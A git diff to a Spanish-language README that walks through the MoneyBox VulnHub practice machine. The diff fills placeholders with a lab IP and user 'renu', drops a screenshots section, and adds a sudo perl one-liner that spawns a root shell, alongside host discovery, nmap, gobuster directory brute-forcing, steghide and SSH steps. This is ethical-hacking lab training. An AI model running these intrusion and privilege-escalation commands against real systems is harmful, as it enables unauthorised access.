@@ -8,7 +8,7 @@
 
 ## 🧠 Descripción
 
-MoneyBox es una máquina vulnerable de VulnHub diseñada para practicar técnicas de penetración en entornos Linux. Ideal para preparación de eJPT, OSCP o mejora de habilidades en hacking ético.
+MoneyBox es una máquina vulnerable de VulnHub diseñada para practicar técnicas de penetración en entornos Linux. Ideal para preparación practicar técnicas básicas de enumeración y escalada de privilegios.
 
 ---
 
@@ -27,21 +27,21 @@ MoneyBox es una máquina vulnerable de VulnHub diseñada para practicar técnica
 
 ### 1. Descubrimiento de la IP
 ```bash
-sudo arp-scan --interface=eth1 192.168.56.100/24
+sudo arp-scan -I eth0 --localnet --ignoredups
 ```
 
 ### 2. Escaneo de Puertos
 ```bash
-nmap -sC -sV -p- <IP>
+nmap -sCV 192.168.1.78
 ```
 
 ### 3. Fuerza Bruta de Directorios
 ```bash
-gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u http://192.168.1.78/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
 ### 4. Análisis de la Página Web
-- Accede a `http://<IP>/blogs/`  
+- Accede a `http://192.168.1.78/blogs/`  
 - Revisa el código fuente y busca pistas.  
 - Descubrirás una clave secreta para usar con Steghide.
 
@@ -53,23 +53,18 @@ cat data.txt
 
 ### 6. Acceso SSH
 ```bash
-ssh <usuario>@<IP>
+ssh renu@192.168.1.78
 ```
 
 ### 7. Escalación de Privilegios
 ```bash
-find / -perm -4000 -type f 2>/dev/null
+sudo perl -e 'exec "/bin/sh";'
 ```
 
 ### 8. Obtención de la Bandera Root
 - Localiza y lee `/root/root.txt`.
 
 ---
-
-## 📸 Capturas de Pantalla
-
-- Guarda las imágenes relevantes en la carpeta `images/`.  
-- Referencia cada paso con capturas para mayor claridad.
 
 ---
 
